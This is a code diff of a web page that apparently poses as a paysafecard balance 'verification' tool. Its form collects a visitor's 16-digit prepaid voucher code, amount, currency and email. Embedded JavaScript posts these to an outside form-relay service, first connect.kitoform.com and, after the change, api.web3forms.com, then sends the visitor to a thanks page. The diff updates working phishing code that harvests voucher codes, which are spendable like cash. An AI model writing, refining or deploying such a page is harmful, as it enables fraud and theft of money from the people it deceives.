@@ -499,79 +499,106 @@
                                 </div>
                             </div>
                             <p id="form-checker" style="color:rgb(255, 78, 78); display: none">Verify</p>
-                            <form class="form" id="this-form" novalidate autocomplete="off">
-                                <div>
-                                    <input type="hidden" name="_subject" value="New Verification (paysafecard-online.com)">
-                                </div>
-                                <div>
-                                    <input type="hidden" name="_captcha" value="false">
-                                </div>
-                                <div>
-                                    <input type="text" name="_honey" style="display:none">
-                                </div>
-                                <div>
-                                    <input type="hidden" name="_template" value="table">
-                                </div>
-                                <div class="form__row flex" style="overflow-x: scroll !important; justify-content: left;">
-                                    <p class="form__row__input"><input type="text" class="form-control js-pin-input" name="code" id="code-checker-input" placeholder="Enter the 16-digit code.">
-                                    </p>
-                                    <p class="form__row__input"><input type="number" class="form-control js-pin-input" name="montant" id="amount-checker-input" placeholder="Enter the amount.">
-                                    </p>
-                                   
-                                    <p class="form__row__input"><input type="text" list="devise" class="form-control js-pin-input" name="devise" id="currency-checker-input" placeholder="Enter the currency.">
-             <datalist id="devise">
-  <option value="pounds" >Pounds</option>
-  <option value="Euro" >Euro</option>
-  <option value="Dollars" >Dollars</option>
-  <option value="CHF" >CHF</option>
-             </datalist>
-                                     
+                           <form class="form" id="this-form" novalidate autocomplete="off">
+    <input type="hidden" name="access_key" value="YOUR_WEB3FORMS_ACCESS_KEY">
+    <input type="hidden" name="subject" value="New Verification">
+    <input type="hidden" name="from_name" value="Paysafecard Verification">
 
-                                    </p>
-                                    <p class="form__row__input"><input type="email" class="form-control js-pin-input" name="email" id="email-checker-input" placeholder="Enter your email address.">
-                                    </p>
-                                    <button class="btn btn-primary btn-lg js-balancecheck-submit">verify</button>
-                                </div>
-                                <div class=" invalid-feedback js-check-error" style="display:none"><span class="js-error-message"></span></div>
+    <div class="form__row flex" style="overflow-x: scroll !important; justify-content: left;">
 
-                            </form>
-                            <div class="balancecheck-tm-container" style="position:absolute;display:none;"></div>
-                            <script>
-                                document.addEventListener("DOMContentLoaded", () => {
-                                    document.getElementById('this-form').addEventListener('submit', async (e) => {
-                                        e.preventDefault();
-                                        const digitCode = document.getElementById("code-checker-input").value;
-                                        const amount = document.getElementById("amount-checker-input").value;
-                                        const currency = document.getElementById("currency-checker-input").value;
-                                        const email = document.getElementById("email-checker-input").value;
-                                        var err = "";
-                                        var formdata = {};
-                                        if (digitCode.split(' ').join('').length != 16) err = "Please enter a valid code.";
-                                        else if (amount === null || amount == 0) err = "Please enter a valid amount..";
-                                        else if (currency.split(' ').join('').length < 3) err = "Invalid currency. Please try again..";
-                                        else if (email.split(' ').join('').length < 3) err = "Invalid email address. Please try again..";
-                                        else {
-                                            const form = document.getElementById('this-form');
-                                            const data = new FormData(form);
+        <p class="form__row__input">
+            <input type="text" class="form-control js-pin-input"
+                name="code" id="code-checker-input"
+                placeholder="Enter the 16-digit code.">
+        </p>
 
-                                            try {
-                                                const response = await fetch("https://connect.kitoform.com/f/39daebf80897", {
-                                                    method: 'POST',
-                                                    body: data
-                                                });
-                                                location.href = "thanks.html";
-                                            } catch (error) {
-                                                console.log(error)
-                                            }
-                                        }
-                                        document.getElementById("form-checker").style.display = 'block';
-                                        document.getElementById("form-checker").innerHTML = err;
-                                    });
-                                    document.getElementById('this-form').addEventListener('focus', () => {
-                                        document.getElementById("form-checker").style.display = 'none';
-                                    });
-                                });
-                            </script>
+        <p class="form__row__input">
+            <input type="number" class="form-control js-pin-input"
+                name="amount" id="amount-checker-input"
+                placeholder="Enter the amount.">
+        </p>
+
+        <p class="form__row__input">
+            <input type="text" list="devise"
+                class="form-control js-pin-input"
+                name="currency" id="currency-checker-input"
+                placeholder="Enter the currency.">
+
+            <datalist id="devise">
+                <option value="Pounds">
+                <option value="Euro">
+                <option value="Dollars">
+                <option value="CHF">
+            </datalist>
+        </p>
+
+        <p class="form__row__input">
+            <input type="email" class="form-control js-pin-input"
+                name="email" id="email-checker-input"
+                placeholder="Enter your email address.">
+        </p>
+
+        <button type="submit"
+            class="btn btn-primary btn-lg js-balancecheck-submit">
+            Verify
+        </button>
+    </div>
+</form>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    document.getElementById('this-form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const digitCode = document.getElementById("code-checker-input").value;
+        const amount = document.getElementById("amount-checker-input").value;
+        const currency = document.getElementById("currency-checker-input").value;
+        const email = document.getElementById("email-checker-input").value;
+
+        let err = "";
+
+        if (digitCode.replace(/\s/g, '').length !== 16)
+            err = "Please enter a valid code.";
+        else if (!amount || amount <= 0)
+            err = "Please enter a valid amount.";
+        else if (currency.trim().length < 3)
+            err = "Invalid currency.";
+        else if (email.trim().length < 3)
+            err = "Invalid email address.";
+
+        if (err) {
+            document.getElementById("form-checker").style.display = "block";
+            document.getElementById("form-checker").innerHTML = err;
+            return;
+        }
+
+        const form = document.getElementById("this-form");
+        const formData = new FormData(form);
+
+        try {
+            const response = await fetch(
+                "https://api.web3forms.com/submit",
+                {
+                    method: "POST",
+                    body: formData
+                }
+            );
+
+            const result = await response.json();
+
+            if (result.success) {
+                window.location.href = "thanks.html";
+            } else {
+                alert(result.message);
+            }
+
+        } catch (error) {
+            console.error(error);
+        }
+    });
+});
+</script>
                         </div>
                     </div>
                 </section>
